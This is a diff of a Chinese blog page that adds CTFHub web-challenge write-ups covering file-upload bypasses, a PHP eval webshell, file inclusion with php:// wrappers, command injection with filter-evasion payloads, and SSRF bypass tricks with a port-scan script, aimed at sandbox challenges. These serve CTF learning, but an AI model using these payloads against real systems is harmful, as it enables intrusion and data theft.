@@ -306,7 +306,7 @@ Hint: If you got 「HTTP Method Not A">
 <script src="/libs/cryptojs/crypto-js.min.js"></script>
 <script>
     (function() {
-        let pwd = 'a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3';
+        let pwd = '';
         if (pwd && pwd.length > 0) {
             if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                 alert('密码错误，将返回主页！');
@@ -319,7 +319,7 @@ Hint: If you got 「HTTP Method Not A">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/30.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -478,14 +478,14 @@ Hint: If you got 「HTTP Method Not A">
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.9k
+                    6.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    11 分
+                    27 分
                 </div>
                 
                 
@@ -680,7 +680,327 @@ $git stash pop          ／／此时你可以把你刚才stash到本地栈中的
 <p>先制作.htaccess再来shell.png（毕竟进行了前端验证）</p>
 <p>1.AddType application/x-httpd-php .png</p>
 <p>2.<?php @eval($_POST['666']);?>一句话，一把梭</p>
-<h4 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h4>
+<h4 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h4><p>引子：</p>
+<p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。</p>
+<p>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p>
+<p>浏览器通常使用MIME类型（而不是文件扩展名）来确定如何处理URL，因此Web服务器在响应头中添加正确的MIME类型非常重要。如果配置不正确，浏览器可能会曲解文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。</p>
+<p>通过介绍可以看出来，这种类型的过滤不是针对文件后缀名，而是根据http响应头信息，所以一定要通过抓包进行分析：</p>
+<p>如果直接传的话会出现下面结果：</p>
+<p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8812%E6%97%A51052_1.png" alt></p>
+<p>但是如果将：</p>
+<p>Content-Type: application/octet-stream</p>
+<p>改为：</p>
+<p>Content-Type: image/png</p>
+<p>就会显示上传成功</p>
+<p>然后一句话，一把梭</p>
+<h5 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h5><p>引子:</p>
+<p><strong>%00截断的两个条件</strong></p>
+<ul>
+<li>php &lt; 5.3.4</li>
+<li>magic_quotes_gpc = off</li>
+</ul>
+<p>木马的文件格式为：phpwebshell.php%00.jpg</p>
+<p>但是这个题需要截断的地方不是从文件的后缀进行截断，而是在响应后信息进行修改</p>
+<p><strong>分析源码：</strong></p>
+<pre><code>if (!empty($_POST[&#39;submit&#39;])) {
+    $name = basename($_FILES[&#39;file&#39;][&#39;name&#39;]);
+    $info = pathinfo($name);
+    $ext = $info[&#39;extension&#39;];
+    $whitelist = array(&quot;jpg&quot;, &quot;png&quot;, &quot;gif&quot;);
+    if (in_array($ext, $whitelist)) {
+        $des = $_GET[&#39;road&#39;] . &quot;/&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $ext;
+        if (move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $des)) {
+            echo &quot;&lt;script&gt;alert(&#39;上传成功&#39;)&lt;/script&gt;&quot;;
+        } else {
+            echo &quot;&lt;script&gt;alert(&#39;上传失败&#39;)&lt;/script&gt;&quot;;
+        }
+    } else {
+        echo &quot;文件类型不匹配&quot;;
+    }
+}</code></pre><p>$_FILES 解释（搬自php手册）<br>$_FILES 数组内容如下:</p>
+<p>$_FILES【‘myFile’][‘name’] 客户端文件的原名称。</p>
+<p>$_FILES【‘myFile’][‘type’] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如”image/gif”。</p>
+<p>$_FILES【‘myFile’][‘size’] 已上传文件的大小，单位为字节。</p>
+<p>$_FILES【‘myFile’][‘tmp_name’] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在 php.ini 的 upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的。</p>
+<p>$_FILES【‘myFile’][‘error’] 和该文件上传相关的错误代码。[‘error’] 是在 PHP 4.2.0 版本中增加的。下面是它的说明：(它们在 PHP 4.3.0 之后变成了 PHP 常量。)</p>
+<p>basename() 函数：返回路径中的文件名部分。<br>$_name 是上传的文件名加后缀<br>$_ext 得到的就是后缀名<br>重点就在 $des这个变量<br>得到的完整路径是 GET[‘road’]+随机数+日期加前面获得的后缀名看到这里基本可看出来，如果直接上传的话，文件是会被重新命名的，所以这里就有一个办法就是在</p>
+<p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8812%E6%97%A51239_3.png" alt></p>
+<p>这里为自己拟定一个文件名字，并且使用00截断后面自动生成的信息，这样就可以防止你上传的文件被认定为临时文件了</p>
+<p>可以看到之前上传的文件都是被认定为临时文件：</p>
+<p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8812%E6%97%A51237_2.png" alt></p>
+<p>最后上传的路径为/uoload/1.php然后一句话，一把梭</p>
+<h5 id="双写后缀"><a href="#双写后缀" class="headerlink" title="双写后缀"></a>双写后缀</h5><p>直接不做修改的上传发现：</p>
+<p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8812%E6%97%A51248_4.png" alt></p>
+<p>php没了！！！</p>
+<p>所以这里关于绕过，而且明显告诉是双写，那就：</p>
+<p>shell.pphphp</p>
+<p>成功了，一把梭（关于怎么绕过要自己不断尝试，即可）</p>
+<h4 id="文件头检查"><a href="#文件头检查" class="headerlink" title="文件头检查"></a>文件头检查</h4><p>都说是文件头检查了，那肯定就是抓包啊</p>
+<p>将文件改为这个</p>
+<p>Content-Type: image/png</p>
+<p>但是说我文件错误，是文件错误，那么就准备改文件，</p>
+<pre><code>GIF89a
+&lt;?php @eval($_POST[&#39;666&#39;]);?&gt;</code></pre><p>把随便一个图片用hex打开发现他头部信息就是这个GIF89a</p>
+<p>然后继续上传准备一把梭</p>
+<p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8812%E6%97%A51301_5.png" alt></p>
+<p>success</p>
+<p>一把梭GG</p>
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="eval执行"><a href="#eval执行" class="headerlink" title="eval执行"></a>eval执行</h3><p>题目：</p>
+<pre><code>&lt;?php
+if (isset($_REQUEST[&#39;cmd&#39;])) {
+    eval($_REQUEST[&quot;cmd&quot;]);
+} else {
+    highlight_file(__FILE__);
+}
+?&gt;</code></pre><ul>
+<li>eval():该函数可以把字符串作为PHP代码执行</li>
+<li>$_REQUEST[’’]:和GET和POST类似，不过反应速度比较慢</li>
+</ul>
+<p>大体意思是：判断cmd是否被设置，若cmd被赋值，则执行如下语句，否则就继续显示以上代码。<br>方法一：</p>
+<p>eval($_REQUEST[“cmd”]);</p>
+<p>通过蚁剑直接连接，密码cmd</p>
+<p>方法二：</p>
+<p>构造URL：?cmd=system(“ls”);</p>
+<p>发现了index.php</p>
+<p>继续构造?cmd=system(“cd /;ls”);</p>
+<p>得到：bin boot dev etc flag_30765 home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</p>
+<p>构造：</p>
+<p>?cmd=system(“cd /;cat flag_30765”);</p>
+<p>success</p>
+<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><pre><code>&lt;?php
+// 关闭错误报告
+error_reporting(0);
+if (isset($_GET[&#39;file&#39;])) {
+//strpos — 查找字符串首次出现的位置
+    if (!strpos($_GET[&quot;file&quot;], &quot;flag&quot;)) {
+        include $_GET[&quot;file&quot;];
+    } else {
+        echo &quot;Hacker!!!&quot;;
+    }
+} else {
+    highlight_file(__FILE__);
+}
+?&gt;</code></pre><p>函数解释：</p>
+<pre><code>#函数查找字符串在另一字符串中第一次出现的位置（区分大小写） 
+strpos(&quot;You love php, I love php too!&quot;,&quot;php&quot;);</code></pre><p>发现一个shell</p>
+<pre><code>&lt;?php eval($_REQUEST[&#39;ctfhub&#39;]);?&gt;
+预定义的 $_REQUEST 变量包含了 $_GET、$_POST 和 $_COOKIE 的内容
+
+$_REQUEST 变量可用来收集通过 GET 和 POST 方法发送的表单数据
+
+$_REQUEST 变量既可以收集GET方法发送的数据，也可以接受POST方法接受的数据</code></pre><p>直接蚁剑吧，发现是txt文件，没办法连接</p>
+<p>因为题目给出：</p>
+<p>i have a <a href="shell.txt">shell</a>, how to use it ?</p>
+<p>所以构造参数：</p>
+<p><a href="http://challenge-799c3c5c6ecef465.sandbox.ctfhub.com:10080/?file=shell.txt" target="_blank" rel="noopener">http://challenge-799c3c5c6ecef465.sandbox.ctfhub.com:10080/?file=shell.txt</a></p>
+<p>然后使用hackbar的postdata传参</p>
+<p>ctfhub=system(‘ls’);</p>
+<p>ctfhub=system(‘ls /‘);</p>
+<p>ctfhub=system(‘cat /flag’);</p>
+<p>得到flag</p>
+<h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p>题型：php伪协议</p>
+<pre><code>php://input特点如下:
+
+1）、Coentent-Type仅在取值为application/x-www-data-urlencoded和multipart/form-data两种情况下，PHP才会将http请求数据包中相应的数据填入全局变量$_POST
+
+2）、PHP不能识别的Content-Type类型的时候，会将http请求包中相应的数据填入变量$HTTP_RAW_POST_DATA
+
+3）、只有Coentent-Type为multipart/form-data的时候，PHP不会将http请求数据包中的相应数据填入php://input，否则其它情况都会。填入的长度，由Coentent-Length指定。
+
+4）、只有Content-Type为application/x-www-data-urlencoded时，php://input数据才跟$_POST数据相一致。
+
+5）、php://input数据总是跟$HTTP_RAW_POST_DATA相同，但是php://input比$HTTP_RAW_POST_DATA更凑效，且不需要特殊设置php.ini
+
+6）、PHP会将PATH字段的query_path部分，填入全局变量$_GET。通常情况下，GET方法提交的http请求，body为空。
+
+总结起来就是，在用$_POST获取不到由APP或者一些接口的回调数据时,就用php://input试试</code></pre><p>题目：</p>
+<pre><code>&lt;?php
+if (isset($_GET[&#39;file&#39;])) {
+    if ( substr($_GET[&quot;file&quot;], 0, 6) === &quot;php://&quot; ) {
+        include($_GET[&quot;file&quot;]);
+    } else {
+        echo &quot;Hacker!!!&quot;;
+    }
+} else {
+    highlight_file(__FILE__);
+}
+?&gt;
+&lt;hr&gt;
+i don&#39;t have shell, how to get flag? &lt;br&gt;
+&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;
+i don&#39;t have shell, how to get flag? 
+phpinfo</code></pre><p>这个应该也是get传参，开头的格式也是?file=,也就是说先对你输入的文件的前六个字符进行判断，如果是php://的话就执行一个php文件，如果不是就gg</p>
+<p>搜索了一下发现这是属于php伪协议的一种类型：</p>
+<p>php://input 是个可以访问请求的原始数据的只读流，可以读取到来自POST的原始数据。但当 enctype=”multipart/form-data” 的时候 php://input 是无效的。</p>
+<p>利用条件：</p>
+<ol>
+<li>allow_url_include = On。</li>
+<li>对allow_url_fopen不做要求。</li>
+</ol>
+<pre><code>http:/xxx/index.php?file=php://input</code></pre><p>其他伪协议可见链接：</p>
+<p><a href="https://blog.csdn.net/qiuyeyijian/article/details/102993218?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control" target="_blank" rel="noopener">https://blog.csdn.net/qiuyeyijian/article/details/102993218?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control</a> (很好的一个写给萌新wp的博主，更多伪协议见下方的推荐其他的文章)</p>
+<p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8813%E6%97%A51747_1.png" alt></p>
+<p>然后则这样就可以了</p>
+<p>补充一个语句：<?php system("find / -name flag*");?>用这个找挺方便的</p>
+<h5 id="读取源代码"><a href="#读取源代码" class="headerlink" title="读取源代码"></a>读取源代码</h5><p>题目：</p>
+<pre><code>&lt;?php
+error_reporting(E_ALL);
+if (isset($_GET[&#39;file&#39;])) {
+    if ( substr($_GET[&quot;file&quot;], 0, 6) === &quot;php://&quot; ) {
+        include($_GET[&quot;file&quot;]);
+    } else {
+        echo &quot;Hacker!!!&quot;;
+    }
+} else {
+    highlight_file(__FILE__);
+    //highlight_file() 函数对文件进行 PHP 语法高亮显示。语法通过使用 HTML 标签进行高亮，会显示规定要显示的文件
+}
+?&gt;
+&lt;hr&gt;
+i don&#39;t have shell, how to get flag? &lt;br&gt;
+flag in &lt;code&gt;/flag&lt;/code&gt;
+i don&#39;t have shell, how to get flag? 
+flag in /flag</code></pre><p>和上一题一样我感觉，但是并不好用</p>
+<pre><code>resource=&lt;要过滤的数据流&gt;            指定了你要筛选过滤的数据流。    必选
+read=&lt;读链的筛选列表&gt;             可以设定一个或多个过滤器名称，以管道符（|）分隔。    可选
+write=&lt;写链的筛选列表&gt;             可以设定一个或多个过滤器名称，以管道符（|）分隔。    可选
+&lt;；两个链的筛选列表&gt;               任何没有以 read= 或 write= 作前缀的筛选器列表会视情况应用于读或写链。</code></pre><p>这里就不能将指令POST上去了，图中又提示了必须使用<code>php://</code>，FLAG在/flag内，因此想到过滤器filter</p>
+<p>考虑到php伪协议里面的直接读取一个文件里面的内容的一个伪协议↓</p>
+<pre><code>?file=php://filter/read=convert.base64-encode/resource=/flag（有绝对路径的限制下只用）
+?file=php://filter/resource=/flag</code></pre><p>success</p>
+<p>考查知识点：php://filter过滤器</p>
+<h4 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h4><p>题目：</p>
+<pre><code>&lt;?php
+error_reporting(0);
+if (isset($_GET[&#39;file&#39;])) {
+    if (!strpos($_GET[&quot;file&quot;], &quot;flag&quot;)) {
+        include $_GET[&quot;file&quot;];
+    } else {
+        echo &quot;Hacker!!!&quot;;
+    }
+} else {
+    highlight_file(__FILE__);
+}
+?&gt;
+&lt;hr&gt;
+i don&#39;t have shell, how to get flag?&lt;br&gt;
+&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;
+i don&#39;t have shell, how to get flag?
+phpinfo</code></pre><p>也是：?file=来进行传参</p>
+<p>让我看phpinfo文件，因为根据前面题总结的经验只要这个allow_url_include = On是开的就可以利用php://伪协议，点开phpinfo发现确实是开的，所以抓包试试，success</p>
+<p>此题目和php://input做法一样</p>
+<h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>题目：</p>
+<pre><code>&lt;?php
+$res = FALSE;
+if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) {
+    $cmd = &quot;ping -c 4 {$_GET[&#39;ip&#39;]}&quot;;
+    exec($cmd, $res);
+}
+?&gt;</code></pre><p>输入框打入：127.0.0.1;ls</p>
+<p>得到</p>
+<pre><code>Array
+(
+    [0] =&gt; PING 127.0.0.1 (127.0.0.1): 56 data bytes
+    [1] =&gt; 24024115330223.php
+    [2] =&gt; index.php
+)</code></pre><p>然后输入：127.0.0.1;cat 24024115330223.php</p>
+<p>页面没有显示，但是在源代码里面显示了flag</p>
+<h4 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h4><p>题目：</p>
+<pre><code>&lt;?php
+$res = FALSE;
+if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) {
+    $ip = $_GET[&#39;ip&#39;];
+    $m = [];
+    if (!preg_match_all(&quot;/cat/&quot;, $ip, $m)) {
+        $cmd = &quot;ping -c 4 {$ip}&quot;;
+        exec($cmd, $res);
+    } else {
+        $res = $m;
+    }
+}
+?&gt;</code></pre><p>和上一题目一样，只不过要防一下过滤</p>
+<p>127.0.0.1;a=ca;b=t;$a$b flag_29869689610883.php</p>
+<p>不错不错新思路</p>
+<h4 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h4><p>在linux系统下：</p>
+<p>1:&lt;&gt;  2:&lt;  3:${IFS}这三个均可以表示空格</p>
+<p>所以</p>
+<p>127.0.0.1;ls</p>
+<p>127.0.0.1;cat&lt;flag_260652093720389.php</p>
+<p>ybs</p>
+<h4 id="过滤目录分隔符"><a href="#过滤目录分隔符" class="headerlink" title="过滤目录分隔符:/\"></a>过滤目录分隔符:/\</h4><p>127.0.0.1;ls</p>
+<p>127.0.0.1;cd flag_is_here;ls</p>
+<p>127.0.0.1;cd flag_is_here;cat flag_25394867112070.php</p>
+<p>也不知道为什么过滤，就好像过滤了一个寂寞</p>
+<h4 id="过滤运算符-amp"><a href="#过滤运算符-amp" class="headerlink" title="过滤运算符:/(||\&amp;)/"></a>过滤运算符:/(||\&amp;)/</h4><p>127.0.0.1;ls</p>
+<p>127.0.0.1;cat flag_13087279769836.php</p>
+<p>这又是一个寂寞</p>
+<h4 id="综合过滤练习：-amp-cat-flag-ctfhub"><a href="#综合过滤练习：-amp-cat-flag-ctfhub" class="headerlink" title="综合过滤练习：/(||&amp;|;| |\/|cat|flag|ctfhub)/"></a>综合过滤练习：/(||&amp;|;| |\/|cat|flag|ctfhub)/</h4><p>提示：%0a(换行符) 、%0d(回车符)</p>
+<p>在这里的输入框输入：</p>
+<p>127.0.0.1%0als</p>
+<p>会发现，%0a会被两次编码，所以直接在URL里面输入才算可以</p>
+<p>考虑到在linux系统内shell执行的并不能识别url编码，那么这里得知可以使用hex16位编码来进行转换：</p>
+<p>使用命令$(printf${IFS}”hex编码”)</p>
+<p>127.0.0.1%0als&lt;$(printf${IFS}”\x66\x6c\x61\x67\x5f\x69\x73\x5f\x68\x65\x72\x65”)</p>
+<p>得到文件：</p>
+<p>flag_144233033911102.php</p>
+<p>构造:</p>
+<p>127.0.0.1;cat flag_is_here/flag_144233033911102.php</p>
+<p>127.0.0.1%0aca’’t${IFS}$(printf${IFS}”\x66\x6C\x61\x67\x5F\x69\x73\x5F\x68\x65\x72\x65\x2F\x66\x6C\x61\x67\x5F\x31\x34\x34\x32\x33\x33\x30\x33\x33\x39\x31\x31\x31\x30\x32\x2E\x70\x68\x70”)</p>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h3><p>题目信息：尝试访问位于127.0.0.1的flag.php吧</p>
+<p>?url=127.0.0.1/flag.php</p>
+<p>GG</p>
+<h4 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h4><p>题目信息：尝试去读取一下Web目录下的flag.php吧</p>
+<p>?url=file:///var/www/html/flag.php</p>
+<p>查看源文件得flag</p>
+<pre><code>URL伪协议：
+file://  本地文件传输协议，File协议主要用于访问本地计算机中的文件，就如同在Windows资源管理器中打开文件一样
+dict://  Dict协议,字典服务器器协议,dict是基于查询响应的TCP协议,它的目标是超越Webster protocol，并允许客户端在使用过程中访问更多字典。Dict服务器和客户机使用TCP端口2628
+gopher://  Gopher协议是互联网上使用的分布型的文件搜集获取网络协议。gopher协议是在HTTP协议出现之前,在internet上常见重用的协议,但是现在已经用的很少了
+sftp://  Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作
+ldap://  LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议
+tftp://  TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</code></pre><h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5><p>题目提示：来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦</p>
+<p>方法一（bp进行端口爆破）：</p>
+<p>爆破格式为</p>
+<p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8813%E6%97%A52212_2.png" alt></p>
+<p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8813%E6%97%A52213_3.png" alt></p>
+<p>响应中查看</p>
+<p>方法二：</p>
+<pre><code>import requests
+url=&#39;http://challenge-48d05bc5759898a5.sandbox.ctfhub.com:10080/?url=127.0.0.1:&#39;
+port=8000
+while port&lt;=9000:
+    Wholeurl=url+str(port)
+    r = requests.get(Wholeurl)
+    print(Wholeurl)
+    if(len(r.content)!=0):
+        print(port)
+        print(r.content)
+        break
+    port=port+1
+print(&quot;over&quot;)</code></pre><p>py脚本进行爆破</p>
+<p><img src="http://images2.5666888.xyz//QQ%E5%9B%BE%E7%89%8720210114112554.png" alt></p>
+<p>（1/13基操↑）</p>
+<h3 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h3><p>提示：这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年</p>
+<h3 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h3><p>描述：请求的URL中必须包含<a href="http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧" target="_blank" rel="noopener">http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧</a></p>
+<p>?url=<a href="http://notfound.ctfhub.com@127.0.0.1/flag.php" target="_blank" rel="noopener">http://notfound.ctfhub.com@127.0.0.1/flag.php</a></p>
+<h4 id="数字IP-Bypass"><a href="#数字IP-Bypass" class="headerlink" title="数字IP Bypass"></a>数字IP Bypass</h4><p>描述：这次ban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢</p>
+<p><del>看了大佬的wp</del>：</p>
+<ol>
+<li>8进制格式：0177.00.00.01</li>
+<li>16进制格式：0x7f.0x0.0x0.0x1</li>
+<li>10进制整数格式：2130706433</li>
+<li>在linux下，0代表127.0.0.1，<a href="http://0进行请求127.0.0.1" target="_blank" rel="noopener">http://0进行请求127.0.0.1</a></li>
+</ol>
+<p>?url=0/flag.php</p>
+<h5 id="302跳转-Bypass"><a href="#302跳转-Bypass" class="headerlink" title="302跳转 Bypass"></a>302跳转 Bypass</h5><p>描述：SSRF中有个很重要的一点是请求可能会跟随302跳转，尝试利用这个来绕过对IP的检测访问到位于127.0.0.1的flag.php吧</p>
+<p>?url=127.0.0.1/flag.php</p>
+<h6 id="DNS重绑定-Bypass"><a href="#DNS重绑定-Bypass" class="headerlink" title="DNS重绑定 Bypass"></a>DNS重绑定 Bypass</h6><p>关键词：DNS重绑定。剩下的自己来吧，也许附件中的链接能有些帮助</p>
+<p><del>搜集wp信息</del>：</p>
+<p>我们这里还是使用DNS重绑定，在网络上存在一个很神奇的服务，<a href="http://xip.io/" target="_blank" rel="noopener">http://xip.io</a> 当我们访问这个网站的子域名的时候，例如127.0.0.1.xip.io，就会自动重定向到127.0.0.1。<br>即：?url=127.0.0.1.xip.io/flag.php</p>
+<p>但是这个题直接这样也可以</p>
+<p>?url=127.0.0.1/flag.php</p>
+<p>毕竟都是定向到127.0.0.1</p>
+
             </div>
             <hr />
 
@@ -1172,7 +1492,7 @@ $git stash pop          ／／此时你可以把你刚才stash到本地栈中的
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/32.jpg" class="responsive-img" alt="python笔记">
+                        <img src="/medias/featureimages/29.jpg" class="responsive-img" alt="python笔记">
                         
                         <span class="card-title">python笔记</span>
                     </div>
@@ -1231,7 +1551,7 @@ mile
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/32.jpg" class="responsive-img" alt="Buuctf笔记">
+                        <img src="/medias/featureimages/30.jpg" class="responsive-img" alt="Buuctf笔记">
                         
                         <span class="card-title">Buuctf笔记</span>
                     </div>
@@ -1444,7 +1764,7 @@ mile
 
             
             &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-            <span class="white-color">30.9k</span>
+            <span class="white-color">34.7k</span>
             
 
             <br>
